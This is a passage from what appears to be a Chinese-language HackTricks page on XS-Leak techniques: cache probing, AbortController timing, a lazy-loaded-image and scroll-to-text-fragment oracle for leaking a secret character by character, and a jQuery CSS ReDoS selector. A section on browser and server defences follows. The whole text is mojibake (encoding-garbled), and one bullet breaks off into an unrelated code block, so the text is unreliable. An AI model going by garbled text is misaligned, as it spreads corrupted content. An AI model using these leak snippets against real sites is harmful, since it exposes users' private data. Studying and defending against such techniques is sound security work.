è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¿™é¡¹æŠ€æœ¯å¾ˆæœ‰è¶£ï¼šChromeç°åœ¨æœ‰**ç¼“å­˜åˆ†åŒº**ï¼Œæ–°æ‰“å¼€é¡µé¢çš„ç¼“å­˜é”®æ˜¯ï¼š`(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`ï¼Œä½†å¦‚æœæˆ‘æ‰“å¼€ä¸€ä¸ªngroké¡µé¢å¹¶åœ¨å…¶ä¸­ä½¿ç”¨fetchï¼Œç¼“å­˜é”®å°†æ˜¯ï¼š`(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`ï¼Œ**ç¼“å­˜é”®ä¸åŒ**ï¼Œå› æ­¤ç¼“å­˜ä¸èƒ½å…±äº«ã€‚ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°æ›´å¤šç»†èŠ‚ï¼š[é€šè¿‡åˆ†åŒºç¼“å­˜è·å¾—å®‰å…¨æ€§å’Œéšç§æ€§](https://developer.chrome.com/blog/http-cache-partitioning/)\
ï¼ˆè¯„è®ºæ¥è‡ª[**è¿™é‡Œ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)ï¼‰
{% endhint %}

å¦‚æœä¸€ä¸ªç«™ç‚¹ `example.com` åŒ…å«äº†æ¥è‡ª `*.example.com/resource` çš„èµ„æºï¼Œé‚£ä¹ˆè¯¥èµ„æºå°†å…·æœ‰ä¸ç›´æ¥**é€šè¿‡é¡¶çº§å¯¼èˆªè¯·æ±‚**çš„èµ„æºç›¸åŒçš„**ç¼“å­˜é”®**ã€‚è¿™æ˜¯å› ä¸ºç¼“å­˜é”®ç”±é¡¶çº§ _eTLD+1_ å’Œæ¡†æ¶ _eTLD+1_ ç»„æˆã€‚

å› ä¸ºè®¿é—®ç¼“å­˜æ¯”åŠ è½½èµ„æºæ›´å¿«ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•æ›´æ”¹é¡µé¢çš„ä½ç½®å¹¶åœ¨20msï¼ˆä¾‹å¦‚ï¼‰åå–æ¶ˆå®ƒã€‚å¦‚æœåœ¨åœæ­¢åæºè¢«æ›´æ”¹ï¼Œè¿™æ„å‘³ç€èµ„æºè¢«ç¼“å­˜äº†ã€‚\
æˆ–è€…åªæ˜¯**å‘é€ä¸€äº›fetchåˆ°å¯èƒ½è¢«ç¼“å­˜çš„é¡µé¢å¹¶æµ‹é‡å®ƒæ‰€éœ€çš„æ—¶é—´**ã€‚

### æ‰‹åŠ¨é‡å®šå‘ <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé‡å®šå‘
* **æ›´å¤šä¿¡æ¯**ï¼š[https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
* **æ¦‚è¦**ï¼šå¯ä»¥æ‰¾å‡ºå¯¹fetchè¯·æ±‚çš„å“åº”æ˜¯å¦æ˜¯é‡å®šå‘
* **ä»£ç ç¤ºä¾‹**ï¼š

![](<../.gitbook/assets/image (652).png>)

### ä½¿ç”¨ AbortController çš„ Fetch <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **æ¦‚è¦**ï¼šå¯ä»¥å°è¯•åŠ è½½èµ„æºå¹¶åœ¨åŠ è½½å®Œæˆå‰ä¸­æ–­ã€‚æ ¹æ®æ˜¯å¦è§¦å‘é”™è¯¯ï¼Œèµ„æºæ˜¯æˆ–ä¸æ˜¯è¢«ç¼“å­˜äº†ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

[**`AbortController`**](https://developer.mozilla.org/en-US/docs/Web/API/AbortController) å¯ä»¥ä¸ _**fetch**_ å’Œ _**setTimeout**_ ç»“åˆä½¿ç”¨ï¼Œæ—¢å¯ä»¥æ£€æµ‹**èµ„æºæ˜¯å¦è¢«ç¼“å­˜**ï¼Œä¹Ÿå¯ä»¥ä»æµè§ˆå™¨ç¼“å­˜ä¸­æ¸…é™¤ç‰¹å®šèµ„æºã€‚è¿™é¡¹æŠ€æœ¯çš„ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œæ¢æµ‹è¿‡ç¨‹ä¸ä¼šåœ¨è¿‡ç¨‹ä¸­ç¼“å­˜æ–°å†…å®¹ã€‚

### è„šæœ¬æ±¡æŸ“

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ ï¼ˆè„šæœ¬ï¼‰
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **æ¦‚è¦**ï¼šå½“**è·¨æºè„šæœ¬**è¢«åŒ…å«åœ¨é¡µé¢ä¸Šæ—¶ï¼Œ**æ— æ³•ç›´æ¥è¯»å–**å…¶å†…å®¹ã€‚ç„¶è€Œï¼Œå¦‚æœè„šæœ¬**ä½¿ç”¨ä»»ä½•å†…ç½®å‡½æ•°**ï¼Œå¯ä»¥**è¦†ç›–å®ƒä»¬**å¹¶è¯»å–å®ƒä»¬çš„å‚æ•°ï¼Œè¿™å¯èƒ½ä¼š**æ³„éœ²å®è´µä¿¡æ¯**ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **åŒ…å«æ–¹æ³•**ï¼šå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´
```html
<img src=/something loading=lazy >
```
å› æ­¤ï¼Œæ‚¨å¯ä»¥åšçš„æ˜¯**æ·»åŠ å¤§é‡æ— ç”¨å­—ç¬¦**ï¼ˆä¾‹å¦‚**æ•°åƒä¸ª"W"**ï¼‰æ¥**å¡«å……ç½‘é¡µï¼Œç›´åˆ°å‡ºç°ç§˜å¯†ï¼Œæˆ–è€…æ·»åŠ ç±»ä¼¼** `<br><canvas height="1850px"></canvas><br>` çš„å†…å®¹ã€‚\
ç„¶åï¼Œå¦‚æœæˆ‘ä»¬çš„**æ³¨å…¥å‡ºç°åœ¨flagä¹‹å‰**ï¼Œ**å›¾ç‰‡**å°†ä¼šè¢«**åŠ è½½**ï¼Œä½†å¦‚æœå‡ºç°åœ¨**flagä¹‹å**ï¼ŒflagåŠ ä¸Šæ— ç”¨ä¿¡æ¯å°†ä¼š**é˜»æ­¢å›¾ç‰‡åŠ è½½**ï¼ˆæ‚¨éœ€è¦å°è¯•æ”¾ç½®å¤šå°‘æ— ç”¨ä¿¡æ¯ï¼‰ã€‚è¿™å°±æ˜¯åœ¨[**è¿™ç¯‡æ–‡ç« **](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/)ä¸­å‘ç”Ÿçš„æƒ…å†µã€‚

å¦ä¸€ä¸ªé€‰é¡¹æ˜¯ä½¿ç”¨**scroll-to-text-fragment**ï¼Œå¦‚æœå…è®¸çš„è¯ï¼š

#### Scroll-to-text-fragment

ç„¶è€Œï¼Œæ‚¨å¯ä»¥è®©**æœºå™¨äººè®¿é—®é¡µé¢**ï¼Œç±»ä¼¼äº
```
#:~:text=SECR
```
å› æ­¤ï¼Œç½‘é¡µå°†æ˜¯è¿™æ ·çš„ï¼š**`https://victim.com/post.html#:~:text=SECR`**

å…¶ä¸­post.htmlåŒ…å«æ”»å‡»è€…çš„åƒåœ¾å­—ç¬¦å’Œæ‡’åŠ è½½å›¾ç‰‡ï¼Œç„¶åæœºå™¨äººçš„ç§˜å¯†è¢«æ·»åŠ ã€‚

è¿™æ®µæ–‡æœ¬çš„ä½œç”¨æ˜¯è®©æœºå™¨äººè®¿é—®é¡µé¢ä¸­åŒ…å«æ–‡æœ¬`SECR`çš„ä»»ä½•æ–‡æœ¬ã€‚ç”±äºè¯¥æ–‡æœ¬æ˜¯ç§˜å¯†ï¼Œå¹¶ä¸”å°±åœ¨**å›¾ç‰‡ä¸‹æ–¹**ï¼Œ**åªæœ‰åœ¨çŒœæµ‹çš„ç§˜å¯†æ­£ç¡®æ—¶å›¾ç‰‡æ‰ä¼šåŠ è½½**ã€‚æ‰€ä»¥ï¼Œä½ å°±æœ‰äº†ä¸€ä¸ªç¥è°•æ¥**é€ä¸ªå­—ç¬¦åœ°æ³„éœ²ç§˜å¯†**ã€‚

ä¸€äº›åˆ©ç”¨è¿™ä¸ªæ¼æ´çš„ä»£ç ç¤ºä¾‹ï¼š[https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### åŸºäºæ‡’åŠ è½½å›¾ç‰‡çš„æ—¶é—´

å¦‚æœ**æ— æ³•åŠ è½½å¤–éƒ¨å›¾ç‰‡**æ¥æŒ‡ç¤ºæ”»å‡»è€…å›¾ç‰‡å·²åŠ è½½ï¼Œå¦ä¸€ä¸ªé€‰é¡¹æ˜¯å°è¯•**å¤šæ¬¡çŒœæµ‹å­—ç¬¦å¹¶æµ‹é‡æ—¶é—´**ã€‚å¦‚æœå›¾ç‰‡åŠ è½½äº†ï¼Œæ‰€æœ‰è¯·æ±‚æ‰€éœ€çš„æ—¶é—´ä¼šæ¯”å›¾ç‰‡æœªåŠ è½½æ—¶é•¿ã€‚è¿™æ˜¯åœ¨[**è¿™ç¯‡writeupçš„è§£å†³æ–¹æ¡ˆ**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/)ä¸­ä½¿ç”¨çš„æ–¹æ³•ï¼Œ**åœ¨è¿™é‡Œæ€»ç»“ï¼š**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

å¦‚æœä½¿ç”¨äº†`jQuery(location.hash)`ï¼Œå¯ä»¥é€šè¿‡è®¡æ—¶æ¥**å‘ç°æ˜¯å¦å­˜åœ¨æŸäº›HTMLå†…å®¹**ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœé€‰æ‹©å™¨`main[id='site-main']`ä¸åŒ¹é…ï¼Œå°±ä¸éœ€è¦æ£€æŸ¥å…¶ä½™çš„**é€‰æ‹©å™¨**ï¼š
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSSæ³¨å…¥

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## é˜²å¾¡æªæ–½

åœ¨æœ¬èŠ‚ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°éƒ¨åˆ†åœ¨[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)ä¸­æ¨èçš„ç¼“è§£æªæ–½ï¼Œä½†æ˜¯åœ¨wikiçš„æ¯ä¸ªéƒ¨åˆ†[https://xsleaks.dev/](https://xsleaks.dev/)ä¸­éƒ½æœ‰æ›´å¤šçš„ç¼“è§£æªæ–½ã€‚è¯·åœ¨é‚£é‡ŒæŸ¥çœ‹æ›´å¤šå…³äºå¦‚ä½•é˜²å¾¡è¿™äº›æŠ€æœ¯çš„ä¿¡æ¯ã€‚

### åŒ…å«æ–¹æ³•ç¼“è§£

* **HTMLå…ƒç´ **ã€‚å¯ä»¥ä½¿ç”¨**CORPå¤´éƒ¨æ¥æ§åˆ¶é¡µé¢æ˜¯å¦å¯ä»¥åµŒå…¥èµ„æº**ã€‚CORPå¯ä»¥è®¾ç½®ä¸ºsame-originæˆ–same-siteï¼Œå¹¶åˆ†åˆ«é˜»æ­¢ä»»ä½•è·¨æºæˆ–è·¨ç«™ç‚¹å¯¹è¯¥èµ„æºçš„è¯·æ±‚ã€‚åœ¨**å®¢æˆ·ç«¯**ï¼ŒåŸºäºChromiumçš„æµè§ˆå™¨ä½¿ç”¨**CORB**ç®—æ³•æ¥å†³å®šæ˜¯å¦å…è®¸æˆ–æ‹’ç»è·¨æºèµ„æºè¯·æ±‚ã€‚
* **æ¡†æ¶**ã€‚é˜²æ­¢iframeå…ƒç´ åŠ è½½HTMLèµ„æºçš„ä¸»è¦é˜²å¾¡æªæ–½æ˜¯ä½¿ç”¨**X-Frame-Options**ã€‚å¦å¤–ï¼Œ**CSPæŒ‡ä»¤frame-ancestors**å¯ä»¥è¾¾åˆ°ç±»ä¼¼çš„æ•ˆæœã€‚å¦‚æœåµŒå…¥è¢«æ‹’ç»ï¼ŒåŒ…å«æ–¹æ³•æ— æ³•æ£€æµ‹åˆ°å“åº”ä¸­çš„å·®å¼‚ã€‚
* **å¼¹å‡ºçª—å£**ã€‚ä¸ºäº†é™åˆ¶å¯¹`window.opener`çš„è®¿é—®ï¼Œ**COOP HTTPå“åº”å¤´**å®šä¹‰äº†ä¸‰ä¸ªä¸åŒçš„å€¼ï¼šunsafe-noneï¼ˆé»˜è®¤ï¼‰ï¼Œsame-origin-allow-popupså’Œsame-originã€‚è¿™äº›å€¼å¯ä»¥ç”¨æ¥**éš”ç¦»æµè§ˆæ ‡ç­¾é¡µå’Œå¼¹å‡ºçª—å£**ï¼Œä»è€Œå‡è½»åŸºäºå¼¹å‡ºçª—å£çš„æ³„éœ²æŠ€æœ¯ã€‚
* **JavaScriptè¯·æ±‚**ã€‚è·¨æºJavaScriptè¯·æ±‚ç»å¸¸ç”¨äºXS-Leakæ”»å‡»ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥å¯¹å‘å‡ºçš„è¯·æ±‚è¿›è¡Œç²¾ç»†æ§åˆ¶ã€‚ç„¶è€Œï¼Œç”±äºè¿™äº›è¯·æ±‚ä¸æ˜¯CORSå¯ç”¨çš„ï¼Œå®ƒä»¬å—åˆ°ä¸HTMLå…ƒç´ ï¼ˆå¦‚è„šæœ¬æˆ–å›¾åƒï¼‰å‘é€çš„è¯·æ±‚ç›¸åŒçš„é™åˆ¶ã€‚å› æ­¤ï¼Œè¿™ç§æ³„éœ²æŠ€æœ¯çš„å½±å“ä¹Ÿå¯ä»¥é€šè¿‡**CORPå’ŒCORB**æ¥**ç¼“è§£**ã€‚

æ›´é€šç”¨çš„æ–¹æ³•ï¼š

* **Fetch Metadata**ã€‚è¿™äº›è¯·æ±‚å¤´å…è®¸æœåŠ¡å™¨æ‰€æœ‰è€…æ›´å¥½åœ°äº†è§£ç”¨æˆ·çš„æµè§ˆå™¨æ˜¯å¦‚ä½•å¼•èµ·ç‰¹å®šè¯·æ±‚çš„ã€‚åœ¨Chromeä¸­ï¼ŒSec-Fetch-\*å¤´ä¼šè‡ªåŠ¨æ·»åŠ åˆ°æ¯ä¸ªè¯·æ±‚ä¸­ï¼Œå¹¶æä¾›æœ‰å…³è¯·æ±‚æ¥æºçš„å…ƒæ•°æ®ã€‚ä¾‹å¦‚ï¼ŒSec-Fetch-Dest: imageæ˜¯ç”±å›¾åƒå…ƒç´ è§¦å‘çš„ã€‚Webåº”ç”¨ç¨‹åºå¯ä»¥é€‰æ‹©æ ¹æ®è¯¥ä¿¡æ¯æ¥é˜»æ­¢è¯·æ±‚ã€‚
* **Same-Site Cookies**ã€‚Same-Site cookieæ ‡å¿—å…è®¸ç½‘ç«™å£°æ˜**cookieæ˜¯å¦åº”è¯¥é™åˆ¶åœ¨åŒç«™ç‚¹æˆ–ç¬¬ä¸€æ–¹ä¸Šä¸‹æ–‡ä¸­**ã€‚æ‰€æœ‰ä¸»è¦æµè§ˆå™¨éƒ½æ”¯æŒSame-Site cookiesã€‚åœ¨GCä¸­ï¼Œæ²¡æœ‰è¯¥å±æ€§çš„cookieç°åœ¨é»˜è®¤ä¸ºLaxã€‚å¯¹äºXS-Leaksï¼Œ**Same-Site cookiesæå¤§åœ°é™åˆ¶äº†æ³„éœ²æ”»å‡»çš„å¯èƒ½æ€§**ã€‚å¦ä¸€æ–¹é¢ï¼Œä¾èµ–äº**`window.open`çš„æ³„éœ²æŠ€æœ¯ä»ç„¶å¯ä»¥ä¸`SameSite=Lax`ä¸€èµ·å·¥ä½œ**ã€‚ä½¿ç”¨**å…¶ä»–è®¤è¯**æ–¹æ³•çš„ç½‘ç«™ï¼Œå¦‚å®¢æˆ·ç«¯è¯ä¹¦å’ŒHTTPè®¤è¯ï¼Œ**ä»ç„¶å®¹æ˜“å—åˆ°æ”»å‡»**ã€‚
* **è·¨æºæ ‡è¯†ç¬¦ä¸å…³è”æ€§ï¼ˆCOIUï¼‰**ã€‚COIUï¼Œä¹Ÿç§°ä¸ºç¬¬ä¸€æ–¹éš”ç¦»ï¼ˆFPIï¼‰ï¼Œæ˜¯ç”¨æˆ·å¯ä»¥åœ¨FFçš„ä¸“å®¶è®¾ç½®ä¸­å¯ç”¨çš„å¯é€‰å®‰å…¨åŠŸèƒ½ï¼ˆabout:configï¼‰ï¼Œæœ€åˆåœ¨Toræµè§ˆå™¨ä¸­å¼•å…¥ã€‚ä»æŠ½è±¡çš„è§’åº¦æ¥çœ‹ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ‰©å±•çš„åŒç«™ç‚¹ä¸Šä¸‹æ–‡ã€‚å®ƒ**å°†å¤šä¸ªèµ„æº**ï¼ˆä¾‹å¦‚ï¼ŒCookiesã€Cacheã€å®¢æˆ·ç«¯å­˜å‚¨ï¼‰**ç»‘å®šåˆ°ç¬¬ä¸€æ–¹**ï¼Œè€Œä¸æ˜¯åœ¨æ‰€æœ‰è®¿é—®è¿‡çš„ç½‘ç«™ä¹‹é—´å…±äº«ã€‚å¦‚æœå¯ç”¨ï¼ŒCOIUå¤§å¤§å‡å°‘äº†XS-Leaksçš„é€‚ç”¨æ€§ï¼Œå› ä¸ºåªæœ‰ä½¿ç”¨å¼¹å‡ºçª—å£çš„æ–¹æ³•ä»ç„¶å¯èƒ½ç¬¦åˆæ”¿ç­–çš„ç¬¬ä¸€æ–¹è¦æ±‚ã€‚
* **è·Ÿè¸ªä¿æŠ¤**ã€‚è‹¹æœåœ¨SAä¸­å®æ–½äº†ä¸€ç§åä¸º**æ™ºèƒ½è·Ÿè¸ªé˜²æŠ¤ï¼ˆITPï¼‰**çš„éšç§æœºåˆ¶ï¼Œæ—¨åœ¨é€šè¿‡é™åˆ¶cookieså’Œå…¶ä»–web APIçš„èƒ½åŠ›æ¥å¯¹æŠ—è·¨ç«™ç‚¹è·Ÿè¸ªã€‚åœ¨SAçš„æ–°ç‰ˆæœ¬ä¸­ï¼ŒITPé»˜è®¤æƒ…å†µä¸‹ä¼šé˜»æ­¢æ‰€æœ‰ç¬¬ä¸‰æ–¹cookiesï¼Œæ²¡æœ‰ä»»ä½•ä¾‹å¤–\[74]ã€‚è¿™ç§é˜»æ­¢é˜²æ­¢äº†æ‰€æœ‰ä¸åŸºäºå¼¹å‡ºçª—å£çš„æ³„éœ²ã€‚FFé‡‡å–äº†ç±»ä¼¼çš„æ–¹æ³•ï¼Œå³å¢å¼ºè·Ÿè¸ªé˜²æŠ¤ï¼ˆETPï¼‰ï¼Œä½†å®ƒä»¬åªé˜»æ­¢å±äºè·Ÿè¸ªæä¾›å•†çš„ç‰¹å®šç¬¬ä¸‰æ–¹cookiesã€‚åœ¨XS-Leaksçš„èƒŒæ™¯ä¸‹ï¼ŒETPåªç¼“è§£äº†é’ˆå¯¹è¿™äº›è·Ÿè¸ªåŸŸçš„æ³„éœ²æŠ€æœ¯ã€‚
* **æµè§ˆå™¨æ‰©å±•**ã€‚å®‰å…¨æ„è¯†å¼ºçš„ç”¨æˆ·å¯ä»¥ä½¿ç”¨**æµè§ˆå™¨æ‰©å±•æ¥é˜²æ­¢æŸäº›åŒ…å«æ–¹æ³•**ã€‚

### æ³„éœ²æŠ€æœ¯ç¼“è§£

* **äº‹ä»¶å¤„ç†å™¨**ã€‚å¯¹è¿™ç§æ³„éœ²æŠ€æœ¯**æœ€æœ‰æ•ˆçš„ç¼“è§£æªæ–½**å°†æ˜¯**å…¨éƒ¨æ‹’ç»å®ƒä»¬**ï¼Œä½†è¿™å°†ç ´åäº’è”ç½‘ä¸Šçš„å¤§å¤šæ•°webåº”ç”¨ç¨‹åºã€‚å› æ­¤ï¼Œæˆ‘ä»¬å»ºè®®**å‡å°‘å¯ä»¥åœ¨äº‹ä»¶ä¸­æ”¶é›†çš„å¿…è¦ä¿¡æ¯æ•°é‡**ã€‚ä¾‹å¦‚ï¼ŒCSPè¿è§„äº‹ä»¶ä¸åº”è¯¥åœ¨blockedURIå­—æ®µä¸­åŒ…å«é‡å®šå‘ç›®æ ‡URLã€‚è¿™ç§è¡Œä¸ºåœ¨FFå’ŒGCçš„æ–°ç‰ˆæœ¬ä¸­å·²ç»å®ç° - åªæœ‰SAä»ç„¶å®¹æ˜“å—åˆ°æ”»å‡»ã€‚
* **é”™è¯¯æ¶ˆæ¯**ã€‚ä¸ºäº†ç¼“è§£åŸºäºé”™è¯¯æ¶ˆæ¯çš„XS-Leaksï¼Œæœ‰ä¸¤ä¸ªä¸»è¦è¦æ±‚ã€‚é¦–å…ˆï¼Œ**é”™è¯¯æ¶ˆæ¯ä¸å¾—åŒ…å«è¯¦ç»†ä¿¡æ¯**ï¼Œç±»ä¼¼äºäº‹ä»¶å¤„ç†å™¨æ¶ˆæ¯ã€‚å…¶æ¬¡ï¼Œæµè§ˆå™¨å¿…é¡»**æœ€å°åŒ–é”™è¯¯æ¶ˆæ¯çš„å‘ç”Ÿ**ã€‚ä¾‹å¦‚SRIé”™è¯¯ã€ContentDocument XFOæˆ–Fetch Redirectçš„XS-Leaksï¼Œæ˜¯æ£€æµ‹æ˜¯å¦æŠ›å‡ºé”™è¯¯æ¶ˆæ¯ã€‚
* **å…¨å±€é™åˆ¶**ã€‚ä¿®å¤æ»¥ç”¨å…¨å±€é™åˆ¶çš„æ³„éœ²æŠ€æœ¯ç›¸å¯¹å¤æ‚ï¼Œå› ä¸ºå®ƒä»¬ä¾èµ–äºç‰©ç†é™åˆ¶ã€‚ä¸€èˆ¬å»ºè®®æ˜¯**åœ¨å°çš„æ¯ç«™ç‚¹åŸºç¡€ä¸Šé™åˆ¶å…¨å±€é™åˆ¶**ã€‚å¦‚æœå…¨å±€é™åˆ¶æ˜¯1ï¼Œå¦‚å¯¹äºæ”¯ä»˜APIï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä»»ä½•æ—¶å€™æ‚„æ‚„å°è¯•æ¿€æ´»WebPayment UIï¼Œè¿™åªæœ‰åœ¨æ²¡æœ‰å…¶ä»–æ ‡ç­¾é¡µåŒæ—¶ä½¿ç”¨UIæ—¶æ‰ä¼šæˆåŠŸã€‚æˆ‘ä»¬å»ºè®®åªåœ¨ä½¿ç”¨å¯ä¿¡äº‹ä»¶æ—¶æ‰è®¿é—®æ”¯ä»˜APIã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œé™¤éç”¨æˆ·æä¾›åŒæ„ï¼Œå¦‚åœ¨å¯¹è¯çª—å£ä¸Šç‚¹å‡»é¼ æ ‡å·¦é”®ï¼Œå¦åˆ™å…¨å±€é™åˆ¶è®¾ç½®ä¸ºé›¶ï¼Œè¿™å°†å…¨å±€é™åˆ¶è®¾ç½®ä¸ºä¸€ã€‚
* **å…¨å±€çŠ¶æ€**ã€‚ä»»ä½•**æµè§ˆå™¨å…¨å±€çŠ¶æ€çš„å±æ€§éƒ½ä¸åº”è¯¥å¯è®¿é—®**ã€‚ä¾‹å¦‚ï¼ŒFFæ˜¯å”¯ä¸€åœ¨å‘ç”Ÿé‡å®šå‘æ—¶æ›´æ–°å…¨å±€çŠ¶æ€å†å²çš„æµè§ˆå™¨ï¼Œè¿™å¯¼è‡´è¯»å–history.lengthã€‚æµè§ˆå™¨åº”è¯¥åœ¨é‡å®šå‘å‘ç”Ÿæ—¶åˆ›å»ºä¸€ä¸ªæ–°çš„å†å²å±æ€§ï¼Œè€Œä¸æ˜¯å…¨å±€å­˜å‚¨ã€‚å…¶ä»–ä¾‹å­åŒ…æ‹¬å…±äº«èµ„æºï¼Œå¦‚ç¼“å­˜ã€‚ç¼“å­˜æ³„éœ²æ»¥ç”¨æµè§ˆå™¨ä¸­æ‰€æœ‰æ‰“å¼€ç½‘ç«™ä½¿ç”¨çš„å…±äº«ç¼“å­˜ã€‚ä¸ºäº†å®Œå…¨ç¼“è§£ç¼“å­˜æ³„éœ²æŠ€æœ¯ï¼ŒHTTPç¼“å­˜å¿…é¡»æŒ‰æ¯ç«™ç‚¹åˆ†åŒºï¼Œå¦‚SAã€GCå’ŒFFæ‰€å®æ–½ã€‚è¯·æ³¨æ„ï¼Œåœ¨SAä¸­ï¼Œiframeä¸å—ç¼“å­˜åˆ†åŒºçš„å½±å“ã€‚
* **æ€§èƒ½API**ã€‚æˆ‘ä»¬è¯æ˜äº†æ€§èƒ½APIæ˜¯ä¸€ä¸ªå‡ºè‰²çš„æ³„éœ²æŠ€æœ¯ã€‚åœ¨è®¸å¤šXS-Leaksä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æµ‹å‡ºè·¨æºè¯·æ±‚çš„å“åº”æ˜¯å¦æœ‰æ€§èƒ½æ¡ç›®ã€‚ä½œä¸ºç»Ÿä¸€ï¼Œæˆ‘ä»¬å»ºè®®ç¡®ä¿æ‰€æœ‰è¯·æ±‚éƒ½å¿…é¡»åˆ›å»ºè¿™æ ·çš„æ¡ç›®ï¼Œå¹¶ä¸”åªè®°å½•è·¨æºè¯·æ±‚çš„æ­£ç¡®å­é›†çš„æ—¶é—´ä¿¡æ¯ã€‚

## å‚è€ƒèµ„æ–™

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
